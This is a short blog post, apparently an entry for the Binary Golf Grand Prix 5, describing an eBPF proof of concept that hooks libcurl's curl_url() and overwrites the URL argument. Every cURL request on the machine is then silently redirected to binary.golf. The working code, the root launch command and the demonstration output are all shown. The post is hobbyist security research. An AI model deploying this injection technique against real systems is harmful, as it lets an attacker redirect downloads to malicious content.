---
title: "bggp5"
date: 2024-06-26T12:09:09-04:00
author: hyp
draft: false
---

## eBPF Filter

For my (first) bggp5 entry, I wanted to do something with process injection. I decided to target cURL for obvious reasons.

I initially started off exploring what I could do with PTRACE, however the binary produced was pretty large (around 14kb) and I didnot have a good way of detecting when new curl processes started and attaching to them.

Thinking more about the problem of detecting newly started processes, I decided to look into eBPF as an option. This turned out to be a good option for both the process detection and reading/writing from process memory.

## Overwriting the URL passed to cURL

During my initial attempts with PTRACE, I discovered that cURL will eventually make a call to curl_url() with the RDX register set to the URL that was passed to cURL through command line arguments. So by attaching a uprobe to the curl_url() function in the libcurl shared library object, I could overwrite the value for RDX, essentially redirecting cURL to the URL of choice.

## PoC
```
import sys
from bcc import BPF
BPF(text="""#include <uapi/linux/ptrace.h> 
void c(struct pt_regs *ctx) {char b[24] = "https://binary.golf/5/5";
bpf_probe_write_user((void *)ctx->dx, b, 24);
};""").attach_uprobe(name=sys.argv[1], sym="curl_url", fn_name="c")
while 1:1
```
This PoC requires bcc for the eBPF python bindings and takes the path to libcurl's shared object file as an argument

```
root@hop:~/bggp/py# python3 g5.py /usr/lib/x86_64-linux-gnu/libcurl.so.4
```

Any cURL executions that take place while this filter is running should redirect to the https://binary.golf/5/5 url and download/display the file contents.

```
hyp@hop:~$ curl https://google.com
Another #BGGP5 download!! @binarygolf https://binary.golf
hyp@hop:~$ curl https://test.test.test
Another #BGGP5 download!! @binarygolf https://binary.golf
hyp@hop:~$ 
``` 
